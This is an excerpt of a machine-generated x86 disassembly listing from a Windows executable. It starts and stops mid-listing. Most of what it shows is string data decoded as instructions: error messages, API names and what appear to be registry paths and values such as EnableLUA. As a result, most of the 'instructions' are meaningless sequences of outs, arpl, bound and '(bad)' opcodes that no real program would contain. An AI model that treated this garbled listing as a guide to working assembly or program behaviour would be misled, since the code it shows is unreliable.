  401d68:	fs gs jbe 0x401dd5
  401d6c:	arpl   WORD PTR [ebp+0x20],sp
  401d6f:	outs   dx,DWORD PTR ds:[esi]
  401d70:	jb     0x401d92
  401d72:	popa   
  401d73:	fs fs jb 0x401ddc
  401d77:	jae    0x401dec
  401d79:	add    BYTE PTR [eax],al
  401d7b:	add    BYTE PTR [esi+0x6f],ch
  401d7e:	and    BYTE PTR [ebx+0x75],dh
  401d81:	arpl   WORD PTR [eax+0x20],bp
  401d84:	jo     0x401df8
  401d86:	outs   dx,DWORD PTR ds:[esi]
  401d87:	arpl   WORD PTR [ebp+0x73],sp
  401d8a:	jae    0x401d8c
  401d8c:	outs   dx,BYTE PTR ds:[esi]
  401d8d:	outs   dx,DWORD PTR ds:[esi]
  401d8e:	je     0x401db0
  401d90:	popa   
  401d91:	and    BYTE PTR [ecx+ebp*2+0x72],ah
  401d95:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  401d9a:	jns    0x401d9c
  401d9c:	outs   dx,BYTE PTR ds:[esi]
  401d9d:	outs   dx,DWORD PTR ds:[esi]
  401d9e:	je     0x401dc0
  401da0:	popa   
  401da1:	and    BYTE PTR [ebx+0x6f],dh
  401da4:	arpl   WORD PTR [ebx+0x65],bp
  401da7:	je     0x401da9
  401da9:	add    BYTE PTR [eax],al
  401dab:	add    BYTE PTR [esi+0x6f],ch
  401dae:	je     0x401dd0
  401db0:	popa   
  401db1:	and    BYTE PTR [ebx+0x74],dh
  401db4:	jb     0x401e1b
  401db6:	popa   
  401db7:	ins    DWORD PTR es:[edi],dx
  401db8:	add    BYTE PTR [eax],al
  401dba:	add    BYTE PTR [eax],al
  401dbc:	outs   dx,BYTE PTR ds:[esi]
  401dbd:	outs   dx,DWORD PTR ds:[esi]
  401dbe:	je     0x401de0
  401dc0:	arpl   WORD PTR [edi+0x6e],bp
  401dc3:	outs   dx,BYTE PTR ds:[esi]
  401dc4:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  401dc9:	add    BYTE PTR [eax],al
  401dcb:	add    BYTE PTR [esi+0x6f],ch
  401dce:	je     0x401df0
  401dd0:	jae    0x401e47
  401dd2:	jo     0x401e44
  401dd4:	outs   dx,DWORD PTR ds:[esi]
  401dd5:	jb     0x401e4b
  401dd7:	gs add BYTE PTR fs:[eax],al
  401ddb:	add    BYTE PTR [edi+0x70],ch
  401dde:	gs jb  0x401e42
  401de1:	je     0x401e4c
  401de3:	outs   dx,DWORD PTR ds:[esi]
  401de4:	outs   dx,BYTE PTR ds:[esi]
  401de5:	and    BYTE PTR [ecx+0x6e],ch
  401de8:	and    BYTE PTR [eax+0x72],dh
  401deb:	outs   dx,DWORD PTR ds:[esi]
  401dec:	addr16 jb 0x401e54
  401def:	jae    0x401e64
  401df1:	add    BYTE PTR [eax],al
  401df3:	add    BYTE PTR [edi+0x70],ch
  401df6:	gs jb  0x401e5a
  401df9:	je     0x401e64
  401dfb:	outs   dx,DWORD PTR ds:[esi]
  401dfc:	outs   dx,BYTE PTR ds:[esi]
  401dfd:	and    BYTE PTR [esi+0x6f],ch
  401e00:	je     0x401e22
  401e02:	jo     0x401e69
  401e04:	jb     0x401e73
  401e06:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x706f0064
  401e0e:	gs jb  0x401e72
  401e11:	je     0x401e7c
  401e13:	outs   dx,DWORD PTR ds:[esi]
  401e14:	outs   dx,BYTE PTR ds:[esi]
  401e15:	and    BYTE PTR [esi+0x6f],ch
  401e18:	je     0x401e3a
  401e1a:	jae    0x401e91
  401e1c:	jo     0x401e8e
  401e1e:	outs   dx,DWORD PTR ds:[esi]
  401e1f:	jb     0x401e95
  401e21:	gs add BYTE PTR fs:[edi+0x70],ch
  401e26:	gs jb  0x401e8a
  401e29:	je     0x401e94
  401e2b:	outs   dx,DWORD PTR ds:[esi]
  401e2c:	outs   dx,BYTE PTR ds:[esi]
  401e2d:	and    BYTE PTR [edi+0x6f],dh
  401e30:	jne    0x401e9e
  401e32:	and    BYTE PTR fs:[edx+0x6c],ah
  401e36:	outs   dx,DWORD PTR ds:[esi]
  401e37:	arpl   WORD PTR [ebx+0x0],bp
  401e3a:	add    BYTE PTR [eax],al
  401e3c:	outs   dx,DWORD PTR ds:[esi]
  401e3d:	ja     0x401ead
  401e3f:	gs jb  0x401e62
  401e42:	fs gs popa 
  401e45:	add    BYTE PTR fs:[eax],al
  401e48:	jo     0x401ebc
  401e4a:	outs   dx,DWORD PTR ds:[esi]
  401e4b:	je     0x401ebc
  401e4d:	arpl   WORD PTR [edi+0x6c],bp
  401e50:	and    BYTE PTR [ebp+0x72],ah
  401e53:	jb     0x401ec4
  401e55:	jb     0x401e57
  401e57:	add    BYTE PTR [eax+0x72],dh
  401e5a:	outs   dx,DWORD PTR ds:[esi]
  401e5b:	je     0x401ecc
  401e5d:	arpl   WORD PTR [edi+0x6c],bp
  401e60:	and    BYTE PTR [esi+0x6f],ch
  401e63:	je     0x401e85
  401e65:	jae    0x401edc
  401e67:	jo     0x401ed9
  401e69:	outs   dx,DWORD PTR ds:[esi]
  401e6a:	jb     0x401ee0
  401e6c:	gs add BYTE PTR fs:[eax],al
  401e70:	jb     0x401ed7
  401e72:	popa   
  401e73:	and    BYTE PTR fs:[edi+0x6e],ch
  401e77:	ins    BYTE PTR es:[edi],dx
  401e78:	jns    0x401e9a
  401e7a:	imul   bp,WORD PTR [ebp+eiz*2+0x20],0x7973
  401e81:	jae    0x401ef7
  401e83:	gs ins DWORD PTR es:[edi],dx
  401e85:	add    BYTE PTR [eax],al
  401e87:	add    BYTE PTR [edx+0x65],dh
  401e8a:	jae    0x401efb
  401e8c:	jne    0x401f00
  401e8e:	arpl   WORD PTR [ebp+0x20],sp
  401e91:	fs gs popa 
  401e94:	fs ins BYTE PTR es:[edi],dx
  401e96:	outs   dx,DWORD PTR ds:[esi]
  401e97:	arpl   WORD PTR [ebx+0x20],bp
  401e9a:	ja     0x401f0b
  401e9c:	jne    0x401f0a
  401e9e:	and    BYTE PTR fs:[edi+0x63],ch
  401ea2:	arpl   WORD PTR [ebp+0x72],si
  401ea5:	add    BYTE PTR [eax],al
  401ea7:	add    BYTE PTR [edx+0x65],dh
  401eaa:	jae    0x401f21
  401eac:	ins    BYTE PTR es:[edi],dx
  401ead:	je     0x401ecf
  401eaf:	outs   dx,DWORD PTR ds:[esi]
  401eb0:	jne    0x401f26
  401eb2:	and    BYTE PTR [edi+0x66],ch
  401eb5:	and    BYTE PTR [edx+0x61],dh
  401eb8:	outs   dx,BYTE PTR ds:[esi]
  401eb9:	add    BYTE PTR gs:[bp+di+0x74],dh
  401ebe:	popa   
  401ebf:	je     0x401f26
  401ec1:	and    BYTE PTR [esi+0x6f],ch
  401ec4:	je     0x401ee6
  401ec6:	jb     0x401f2d
  401ec8:	arpl   WORD PTR [edi+0x76],bp
  401ecb:	gs jb  0x401f2f
  401ece:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  401ed2:	add    BYTE PTR [eax],al
  401ed4:	jae    0x401f4a
  401ed6:	jb     0x401f3d
  401ed8:	popa   
  401ed9:	ins    DWORD PTR es:[edi],dx
  401eda:	and    BYTE PTR [ecx+ebp*2+0x6d],dh
  401ede:	outs   dx,DWORD PTR gs:[esi]
  401ee0:	jne    0x401f56
  401ee2:	add    BYTE PTR [eax],al
  401ee4:	je     0x401f4b
  401ee6:	js     0x401f5c
  401ee8:	and    BYTE PTR [esi+0x69],ah
  401eeb:	ins    BYTE PTR es:[edi],dx
  401eec:	and    BYTE PTR gs:[edx+0x75],ah
  401ef0:	jae    0x401f6b
  401ef2:	add    BYTE PTR [eax],al
  401ef4:	je     0x401f5f
  401ef6:	ins    DWORD PTR es:[edi],dx
  401ef7:	gs and BYTE PTR fs:[edi+0x75],ch
  401efc:	je     0x401efe
  401efe:	add    BYTE PTR [eax],al
  401f00:	je     0x401f71
  401f02:	outs   dx,DWORD PTR ds:[esi]
  401f03:	and    BYTE PTR [ebp+0x61],ch
  401f06:	outs   dx,BYTE PTR ds:[esi]
  401f07:	jns    0x401f29
  401f09:	imul   bp,WORD PTR [ebp+eiz*2+0x73],0x6f20
  401f10:	jo     0x401f77
  401f12:	outs   dx,BYTE PTR ds:[esi]
  401f13:	and    BYTE PTR [ecx+0x6e],ch
  401f16:	and    BYTE PTR [ebx+0x79],dh
  401f19:	jae    0x401f8f
  401f1b:	gs ins DWORD PTR es:[edi],dx
  401f1d:	add    BYTE PTR [eax],al
  401f1f:	add    BYTE PTR [edi+ebp*2+0x6f],dh
  401f23:	and    BYTE PTR [ebp+0x61],ch
  401f26:	outs   dx,BYTE PTR ds:[esi]
  401f27:	jns    0x401f49
  401f29:	ins    BYTE PTR es:[edi],dx
  401f2a:	imul   ebp,DWORD PTR [esi+0x6b],0x74000073
  401f31:	outs   dx,DWORD PTR ds:[esi]
  401f32:	outs   dx,DWORD PTR ds:[esi]
  401f33:	and    BYTE PTR [ebp+0x61],ch
  401f36:	outs   dx,BYTE PTR ds:[esi]
  401f37:	jns    0x401f59
  401f39:	jae    0x401fb4
  401f3b:	ins    DWORD PTR es:[edi],dx
  401f3c:	bound  ebp,QWORD PTR [edi+0x6c]
  401f3f:	imul   esp,DWORD PTR [ebx+0x20],0x6b6e696c
  401f46:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  401f4a:	gs ins BYTE PTR es:[edi],dx
  401f4c:	jae    0x401f4e
  401f4e:	add    BYTE PTR [eax],al
  401f50:	jbe    0x401fb3
  401f52:	ins    BYTE PTR es:[edi],dx
  401f53:	jne    0x401fba
  401f55:	and    BYTE PTR [edi+ebp*2+0x6f],dh
  401f59:	and    BYTE PTR [ecx+eiz*2+0x72],ch
  401f5d:	add    BYTE PTR gs:[bx+0x72],dh
  401f62:	outs   dx,DWORD PTR ds:[esi]
  401f63:	outs   dx,BYTE PTR ds:[esi]
  401f64:	and    BYTE PTR [bx+si+0x72],dh
  401f68:	outs   dx,DWORD PTR ds:[esi]
  401f69:	je     0x401fda
  401f6b:	arpl   WORD PTR [edi+0x6c],bp
  401f6e:	and    BYTE PTR [ecx+edi*2+0x70],dh
  401f72:	add    BYTE PTR gs:[esi+0x0],ch
  401f76:	je     0x401f78
  401f78:	add    BYTE PTR fs:[eax+eax*1+0x6c],ch
  401f7d:	add    BYTE PTR [esi],ch
  401f7f:	add    BYTE PTR [eax+eax*1+0x6c],ah
  401f83:	add    BYTE PTR [eax+eax*1+0x0],ch
  401f87:	add    BYTE PTR [esp+eiz*2+0x72],cl
  401f8b:	inc    esi
  401f8c:	popa   
  401f8d:	jae    0x402003
  401f8f:	inc    esi
  401f90:	popa   
  401f91:	imul   ebp,DWORD PTR [ecx+ecx*2+0x6e],0x64616f4c
  401f99:	gs jb  0x401fdf
  401f9c:	popa   
  401f9d:	ins    BYTE PTR es:[edi],dx
  401f9e:	ins    BYTE PTR es:[edi],dx
  401f9f:	outs   dx,DWORD PTR ds:[esi]
  401fa0:	jne    0x402016
  401fa2:	add    BYTE PTR [eax],al
  401fa4:	push   edx
  401fa5:	je     0x402013
  401fa7:	dec    esi
  401fa8:	je     0x401ffd
  401faa:	je     0x40200d
  401fac:	je     0x402023
  401fae:	jae    0x402004
  401fb0:	outs   dx,DWORD PTR ds:[esi]
  401fb1:	inc    esp
  401fb2:	outs   dx,DWORD PTR ds:[esi]
  401fb3:	jae    0x401ffa
  401fb5:	jb     0x402029
  401fb7:	outs   dx,DWORD PTR ds:[esi]
  401fb8:	jb     0x402008
  401fba:	outs   dx,DWORD PTR ds:[esi]
  401fbb:	push   esp
  401fbc:	bound  eax,QWORD PTR gs:[eax]
  401fbf:	add    ah,bh
  401fc1:	and    al,BYTE PTR [eax+0x0]
  401fc4:	lock xor DWORD PTR [eax+0x0],eax
  401fc8:	push   eax
  401fc9:	xor    al,BYTE PTR [eax+0x0]
  401fcc:	loopne 0x402003
  401fce:	inc    eax
  401fcf:	add    al,al
  401fd1:	xor    DWORD PTR [eax+0x0],eax
  401fd4:	jl     0x401ff9
  401fd6:	inc    eax
  401fd7:	add    al,dh
  401fd9:	xor    DWORD PTR [eax+0x0],eax
  401fdc:	push   eax
  401fdd:	xor    al,BYTE PTR [eax+0x0]
  401fe0:	loopne 0x402017
  401fe2:	inc    eax
  401fe3:	add    al,al
  401fe5:	xor    DWORD PTR [eax+0x0],eax
  401fe8:	inc    eax
  401fe9:	cmp    eax,0x3cc00040
  401fee:	inc    eax
  401fef:	add    BYTE PTR [eax+0x7000403a],ah
  401ff5:	cmp    eax,0xa4f90040
  401ffa:	repz xor DWORD PTR [edi+0x7],edi
  401ffe:	add    al,0x46
  402000:	xchg   ebp,eax
  402001:	ins    DWORD PTR es:[edi],dx
  402002:	push   0x5d9e5e61
  402007:	add    al,0x66
  402009:	xor    ah,BYTE PTR [edi+0x790cdf99]
  40200f:	inc    esp
  402010:	mov    BYTE PTR [edi-0x5534bde8],ch
  402016:	fisub  DWORD PTR [edx]
  402018:	imul   eax,DWORD PTR [eax],0x6a006d
  40201e:	jo     0x402020
  402020:	jne    0x402022
  402022:	je     0x402024
  402024:	jns    0x402026
  402026:	arpl   WORD PTR [eax],ax
  402028:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40202d:	add    BYTE PTR [eax+eax*1+0x0],ch
  402031:	add    BYTE PTR [eax],al
  402033:	add    BYTE PTR [edi+0x70],cl
  402036:	outs   dx,BYTE PTR gs:[esi]
  402038:	push   ebp
  402039:	je     0x4020b4
  40203b:	add    BYTE PTR [edi],ch
  40203d:	add    BYTE PTR [eax+eax*1+0x0],ah
  402041:	add    BYTE PTR [eax],al
  402043:	add    BYTE PTR [edi],ch
  402045:	add    BYTE PTR [eax+eax*1+0x0],al
  402049:	add    BYTE PTR [eax],al
  40204b:	add    BYTE PTR [edi],ch
  40204d:	add    BYTE PTR [eax+0x0],dh
  402050:	add    BYTE PTR [eax],al
  402052:	add    BYTE PTR [eax],al
  402054:	das    
  402055:	add    BYTE PTR [eax+0x0],dl
  402058:	add    BYTE PTR [eax],al
  40205a:	add    BYTE PTR [eax],al
  40205c:	das    
  40205d:	add    BYTE PTR [ebx+0x0],dl
  402060:	pop    ecx
  402061:	add    BYTE PTR [ebx+0x0],dl
  402064:	push   ebx
  402065:	add    BYTE PTR [ebp+0x0],al
  402068:	push   esp
  402069:	add    BYTE PTR [eax],al
  40206b:	add    BYTE PTR [eax+0x72],dl
  40206e:	outs   dx,DWORD PTR ds:[esi]
  40206f:	jo     0x4020d6
  402071:	jb     0x4020e7
  402073:	jns    0x4020be
  402075:	outs   dx,BYTE PTR ds:[esi]
  402076:	jbe    0x4020e7
  402078:	imul   esp,DWORD PTR [ebp+0x0],0x0
  40207c:	push   ebx
  40207d:	jns    0x4020f2
  40207f:	je     0x4020e6
  402081:	ins    DWORD PTR es:[edi],dx
  402082:	push   ebx
  402083:	gs je  0x4020fa
  402086:	imul   ebp,DWORD PTR [esi+0x67],0x73
  40208d:	add    BYTE PTR [eax],al
  40208f:	add    BYTE PTR [esi+0x65],dh
  402092:	arpl   WORD PTR [edi+ebp*2+0x72],si
  402096:	cmp    al,0x54
  402098:	and    BYTE PTR ds:[edi+ebp*2+0x6f],dh
  40209d:	and    BYTE PTR [edi+ebp*2+0x6e],ch
  4020a1:	add    BYTE PTR [bx+si],al
  4020a4:	outs   dx,DWORD PTR ds:[esi]
  4020a5:	add    BYTE PTR [eax+eax*1+0x65],ch
  4020a9:	add    BYTE PTR [ebx],dh
  4020ab:	add    BYTE PTR [edx],dh
  4020ad:	add    BYTE PTR [esi],ch
  4020af:	add    BYTE PTR [eax+eax*1+0x6c],ah
  4020b3:	add    BYTE PTR [eax+eax*1+0x0],ch
  4020b7:	add    BYTE PTR [esp+ebp*2+0x6c],al
  4020bb:	inc    edi
  4020bc:	gs je  0x402102
  4020bf:	ins    BYTE PTR es:[edi],dx
  4020c0:	popa   
  4020c1:	jae    0x402136
  4020c3:	dec    edi
  4020c4:	bound  ebp,QWORD PTR [edx+0x65]
  4020c7:	arpl   WORD PTR [eax+eax*1+0x0],si
  4020cb:	add    BYTE PTR [esp+ebp*2+0x6c],al
  4020cf:	inc    ebx
  4020d0:	popa   
  4020d1:	outs   dx,BYTE PTR ds:[esi]
  4020d2:	push   ebp
  4020d3:	outs   dx,BYTE PTR ds:[esi]
  4020d4:	ins    BYTE PTR es:[edi],dx
  4020d5:	outs   dx,DWORD PTR ds:[esi]
  4020d6:	popa   
  4020d7:	fs dec esi
  4020d9:	outs   dx,DWORD PTR ds:[esi]
  4020da:	ja     0x4020dc
  4020dc:	imul   eax,DWORD PTR [eax],0x65
  4020df:	add    BYTE PTR [edx+0x0],dh
  4020e2:	outs   dx,BYTE PTR ds:[esi]
  4020e3:	add    BYTE PTR [ebp+0x0],ah
  4020e6:	ins    BYTE PTR es:[edi],dx
  4020e7:	add    BYTE PTR [ebx],dh
  4020e9:	add    BYTE PTR [edx],dh
  4020eb:	add    BYTE PTR [eax],al
  4020ed:	add    BYTE PTR [eax],al
  4020ef:	add    BYTE PTR [ebx+0x65],dl
  4020f2:	je     0x402144
  4020f4:	jb     0x402165
  4020f6:	arpl   WORD PTR [ebp+0x73],sp
  4020f9:	jae    0x40213f
  4020fb:	inc    ebp
  4020fc:	push   eax
  4020fd:	push   eax
  4020fe:	outs   dx,DWORD PTR ds:[esi]
  4020ff:	ins    BYTE PTR es:[edi],dx
  402100:	imul   esp,DWORD PTR [ebx+0x79],0x0
  402107:	add    BYTE PTR [ebx+0x0],dl
  40210a:	outs   dx,DWORD PTR ds:[esi]
  40210b:	add    BYTE PTR [esi+0x0],ah
  40210e:	je     0x402110
  402110:	ja     0x402112
  402112:	popa   
  402113:	add    BYTE PTR [edx+0x0],dh
  402116:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  40211b:	add    BYTE PTR [ecx+0x0],ch
  40211e:	arpl   WORD PTR [eax],ax
  402120:	jb     0x402122
  402122:	outs   dx,DWORD PTR ds:[esi]
  402123:	add    BYTE PTR [ebx+0x0],dh
  402126:	outs   dx,DWORD PTR ds:[esi]
  402127:	add    BYTE PTR [esi+0x0],ah
  40212a:	je     0x40212c
  40212c:	pop    esp
  40212d:	add    BYTE PTR [edi+0x0],dl
  402130:	imul   eax,DWORD PTR [eax],0x64006e
  402136:	outs   dx,DWORD PTR ds:[esi]
  402137:	add    BYTE PTR [edi+0x0],dh
  40213a:	jae    0x40213c
  40213c:	pop    esp
  40213d:	add    BYTE PTR [ebx+0x0],al
  402140:	jne    0x402142
  402142:	jb     0x402144
  402144:	jb     0x402146
  402146:	add    BYTE PTR gs:[esi+0x0],ch
  40214a:	je     0x40214c
  40214c:	push   esi
  40214d:	add    BYTE PTR [ebp+0x0],ah
  402150:	jb     0x402152
  402152:	jae    0x402154
  402154:	imul   eax,DWORD PTR [eax],0x6e006f
  40215a:	pop    esp
  40215b:	add    BYTE PTR [eax+0x0],dl
  40215e:	outs   dx,DWORD PTR ds:[esi]
  40215f:	add    BYTE PTR [eax+eax*1+0x69],ch
  402163:	add    BYTE PTR [ebx+0x0],ah
  402166:	imul   eax,DWORD PTR [eax],0x730065
  40216c:	pop    esp
  40216d:	add    BYTE PTR [ebx+0x0],dl
  402170:	jns    0x402172
  402172:	jae    0x402174
  402174:	je     0x402176
  402176:	add    BYTE PTR gs:[ebp+0x0],ch
  40217a:	add    BYTE PTR [eax],al
  40217c:	inc    ebp
  40217d:	add    BYTE PTR [esi+0x0],ch
  402180:	popa   
  402181:	add    BYTE PTR [edx+0x0],ah
  402184:	ins    BYTE PTR es:[edi],dx
  402185:	add    BYTE PTR [ebp+0x0],ah
  402188:	dec    esp
  402189:	add    BYTE PTR [ebp+0x0],dl
  40218c:	inc    ecx
  40218d:	add    BYTE PTR [eax],al
  40218f:	add    BYTE PTR [ebx+0x0],dl
  402192:	dec    edi
  402193:	add    BYTE PTR [esi+0x0],al
  402196:	push   esp
  402197:	add    BYTE PTR [edi+0x0],dl
  40219a:	inc    ecx
  40219b:	add    BYTE PTR [edx+0x0],dl
  40219e:	inc    ebp
  40219f:	add    BYTE PTR [eax+eax*1+0x43],bl
  4021a3:	add    BYTE PTR [eax+eax*1+0x61],ch
  4021a7:	add    BYTE PTR [ebx+0x0],dh
  4021aa:	jae    0x4021ac
  4021ac:	add    BYTE PTR gs:[ebx+0x0],dh
  4021b0:	pop    esp
  4021b1:	add    BYTE PTR [ebx+0x0],al
  4021b4:	dec    esp
  4021b5:	add    BYTE PTR [ebx+0x0],dl
  4021b8:	dec    ecx
  4021b9:	add    BYTE PTR [eax+eax*1+0x5c],al
  4021bd:	add    BYTE PTR ds:0x5c007300,ah
  4021c3:	add    BYTE PTR [ecx+0x0],cl
  4021c6:	outs   dx,BYTE PTR ds:[esi]
  4021c7:	add    BYTE PTR [eax+0x0],dh
  4021ca:	jb     0x4021cc
  4021cc:	outs   dx,DWORD PTR ds:[esi]
  4021cd:	add    BYTE PTR [ebx+0x0],ah
  4021d0:	push   ebx
  4021d1:	add    BYTE PTR [ebp+0x0],ah
  4021d4:	jb     0x4021d6
  4021d6:	jbe    0x4021d8
  4021d8:	add    BYTE PTR gs:[edx+0x0],dh
  4021dc:	xor    eax,DWORD PTR [eax]
  4021de:	xor    al,BYTE PTR [eax]
  4021e0:	add    BYTE PTR [eax],al
  4021e2:	add    BYTE PTR [eax],al
  4021e4:	add    DWORD PTR [eax],eax
  4021e6:	add    BYTE PTR [eax],al
  4021e8:	add    BYTE PTR [eax],al
  4021ea:	add    BYTE PTR [eax],al
  4021ec:	rol    BYTE PTR [eax],0x0
  4021ef:	add    BYTE PTR [eax],al
  4021f1:	add    BYTE PTR [eax],al
  4021f3:	inc    esi
	...
  402204:	cs jmp 0x407a39
  40220a:	add    BYTE PTR [eax],al
  40220c:	add    al,BYTE PTR [eax]
  40220e:	add    BYTE PTR [eax],al
  402210:	and    al,0x0
  402212:	add    BYTE PTR [eax],al
  402214:	je     0x40223c
  402216:	add    BYTE PTR [eax],al
  402218:	je     0x402234
  40221a:	add    BYTE PTR [eax],al
  40221c:	add    BYTE PTR [eax],al
  40221e:	add    BYTE PTR [eax],al
  402220:	cs jmp 0x407a55
  402226:	add    BYTE PTR [eax],al
  402228:	or     eax,0xa8000000
  40222d:	add    al,BYTE PTR [eax]
  40222f:	add    BYTE PTR [esi+eiz*1+0x1aac0000],ch
	...
  402256:	add    BYTE PTR [eax],al
  402258:	push   0x0
	...
  402291:	add    BYTE PTR [eax],al
  402293:	add    BYTE PTR [eax+eiz*2],al
  402296:	inc    eax
  402297:	add    BYTE PTR [eax+0x4004023],dl
  40229d:	add    BYTE PTR [eax],al
  40229f:	add    BYTE PTR [ecx+esi*2+0x40],bh
  4022a3:	add    BYTE PTR [eax],al
  4022a5:	add    BYTE PTR [eax],al
  4022a7:	add    BYTE PTR [eax],bh
  4022a9:	adc    BYTE PTR [eax+0x0],al
  4022ac:	cmp    BYTE PTR [eax],al
  4022ae:	add    BYTE PTR [eax],al
  4022b0:	add    BYTE PTR ds:0x0,dh
	...
  4022be:	add    BYTE PTR [eax],al
  4022c0:	in     al,0x60
  4022c2:	inc    eax
  4022c3:	add    BYTE PTR [edx],al
  4022c5:	add    BYTE PTR [eax],al
  4022c7:	add    BYTE PTR [eax],al
  4022c9:	add    BYTE PTR [eax],al
  4022cb:	add    bh,bh
  4022cd:	(bad)  
  4022ce:	(bad)  
  4022cf:	inc    DWORD PTR [eax]
  4022d1:	add    BYTE PTR [eax],al
  4022d3:	add    BYTE PTR [eax+0x0],al
  4022d6:	add    BYTE PTR [eax],al
  4022d8:	in     al,dx
  4022d9:	and    al,BYTE PTR [eax+0x0]
  4022dc:	shl    BYTE PTR [edx],0x40
  4022df:	add    BYTE PTR [eax],dl
  4022e1:	and    eax,DWORD PTR [eax+0x0]
  4022e4:	inc    esp
  4022e5:	and    eax,DWORD PTR [eax+0x0]
	...
  4022f4:	add    eax,DWORD PTR [eax]
  4022f6:	add    BYTE PTR [eax],al
  4022f8:	fsub   QWORD PTR [edx]
  4022fa:	inc    eax
	...
  402307:	add    ah,ah
  402309:	pusha  
  40230a:	inc    eax
  40230b:	add    ah,ch
  40230d:	and    al,BYTE PTR [eax+0x0]
  402310:	adc    al,0x61
  402312:	inc    eax
  402313:	add    BYTE PTR [ecx],al
  402315:	add    BYTE PTR [eax],al
  402317:	add    BYTE PTR [eax],al
  402319:	add    BYTE PTR [eax],al
  40231b:	add    bh,bh
  40231d:	(bad)  
  40231e:	(bad)  
  40231f:	inc    DWORD PTR [eax]
  402321:	add    BYTE PTR [eax],al
  402323:	add    BYTE PTR [eax+0x0],al
  402326:	add    BYTE PTR [eax],al
  402328:	ins    BYTE PTR es:[edi],dx
  402329:	and    eax,DWORD PTR [eax+0x0]
  40232c:	inc    esp
  40232d:	and    eax,DWORD PTR [eax+0x0]
	...
  40233c:	add    DWORD PTR [eax],eax
  40233e:	add    BYTE PTR [eax],al
  402340:	sub    al,0x23
  402342:	inc    eax
  402343:	add    BYTE PTR [ecx+eiz*2],bh
  402346:	inc    eax
	...
  40234f:	add    bh,bh
  402351:	(bad)  
  402352:	(bad)  
  402353:	inc    DWORD PTR [eax]
  402355:	add    BYTE PTR [eax],al
  402357:	add    BYTE PTR [eax+0x0],al
  40235a:	add    BYTE PTR [eax],al
  40235c:	xor    al,0x23
  40235e:	inc    eax
  40235f:	add    BYTE PTR [eax],dl
  402361:	and    eax,DWORD PTR [eax+0x0]
  402364:	inc    esp
  402365:	and    eax,DWORD PTR [eax+0x0]
	...
  402374:	add    al,BYTE PTR [eax]
  402376:	add    BYTE PTR [eax],al
  402378:	pusha  
  402379:	and    eax,DWORD PTR [eax+0x0]
	...
  402388:	adc    al,0x61
  40238a:	inc    eax
  40238b:	add    BYTE PTR [ebx+eiz*1+0x40],ch
  40238f:	add    BYTE PTR [eax],dh
  402391:	dec    edx
  402392:	add    BYTE PTR [eax],al
  402394:	cmp    eax,0x77000056
  402399:	push   esi
  40239a:	add    BYTE PTR [eax],al
  40239c:	xchg   edi,eax
  40239d:	push   esi
  40239e:	add    BYTE PTR [eax],al
  4023a0:	inc    ebp
  4023a1:	push   esp
  4023a2:	push   edi
  4023a3:	xor    BYTE PTR [eax],dl
  4023a5:	add    BYTE PTR [eax],al
  4023a7:	add    BYTE PTR [esi+0x2b88040e],al
  4023ad:	add    eax,0xb03bb8a
  4023b2:	add    eax,0x0
  4023b7:	add    BYTE PTR [eax],al
  4023b9:	and    BYTE PTR [eax],al
  4023bb:	add    bh,dh
  4023bd:	add    BYTE PTR [eax],al
  4023bf:	inc    esi
  4023c0:	popa   
  4023c1:	ins    BYTE PTR es:[edi],dx
  4023c2:	ins    BYTE PTR es:[edi],dx
  4023c3:	bound  esp,QWORD PTR [ecx+0x63]
  4023c6:	imul   eax,DWORD PTR [ebp+0x72],0x72
  4023ca:	outs   dx,DWORD PTR ds:[esi]
  4023cb:	jb     0x4023cd
  4023cd:	ja     0x402438
  4023cf:	ins    BYTE PTR es:[edi],dx
  4023d0:	push   edx
  4023d1:	gs jae 0x402449
  4023d4:	ins    BYTE PTR es:[edi],dx
  4023d5:	je     0x4023d7
  4023d7:	cwde   
  4023d8:	push   cs
  4023d9:	push   0x75736572
  4023de:	ins    BYTE PTR es:[edi],dx
  4023df:	je     0x4023e1
  4023e1:	or     BYTE PTR [esi+0x69],ah
  4023e4:	ins    BYTE PTR es:[edi],dx
  4023e5:	gs dec esi
  4023e7:	popa   
  4023e8:	ins    DWORD PTR es:[edi],dx
  4023e9:	add    BYTE PTR gs:[edx],al
  4023ec:	ins    BYTE PTR es:[edi],dx
  4023ed:	imul   ebp,DWORD PTR [esi+0x65],0x626d754e
  4023f4:	gs jb  0x4023f7
  4023f7:	or     BYTE PTR [ebp+0x6f],ch
  4023fa:	fs jne 0x402469
  4023fd:	add    BYTE PTR gs:[edx],al
  402400:	popaw  
  402402:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x70795465
  40240a:	add    BYTE PTR gs:[eax],cl
  40240d:	ins    DWORD PTR es:[edi],dx
  40240e:	gs jae 0x402484
  402411:	popa   
  402412:	add    BYTE PTR gs:[bx+di],al
  402416:	je     0x402480
  402418:	jb     0x40247f
  40241a:	popa   
  40241b:	fs dec ecx
  40241d:	add    BYTE PTR fs:[eax],cl
  402420:	arpl   WORD PTR [ecx+0x6c],sp
  402423:	ins    BYTE PTR es:[edi],dx
  402424:	inc    ebx
  402425:	outs   dx,DWORD PTR ds:[esi]
  402426:	outs   dx,BYTE PTR ds:[esi]
  402427:	je     0x40248e
  402429:	js     0x40249f
  40242b:	add    BYTE PTR [edx],al
  40242d:	outs   dx,DWORD PTR ds:[esi]
  40242e:	jb     0x402499
  402430:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  402438:	inc    ebx
  402439:	outs   dx,DWORD PTR ds:[esi]
  40243a:	outs   dx,BYTE PTR ds:[esi]
  40243b:	je     0x4024a2
  40243d:	js     0x4024b3
  40243f:	dec    ecx
  402440:	add    BYTE PTR fs:[eax],cl
  402443:	outs   dx,DWORD PTR ds:[esi]
  402444:	jb     0x4024af
  402446:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  40244e:	inc    ebx
  40244f:	outs   dx,DWORD PTR ds:[esi]
  402450:	outs   dx,BYTE PTR ds:[esi]
  402451:	je     0x4024b8
  402453:	js     0x4024c9
  402455:	dec    esi
  402456:	popa   
  402457:	ins    DWORD PTR es:[edi],dx
  402458:	add    BYTE PTR gs:[edx],al
  40245b:	outs   dx,DWORD PTR ds:[esi]
  40245c:	jb     0x4024c7
  40245e:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  402466:	inc    ebx
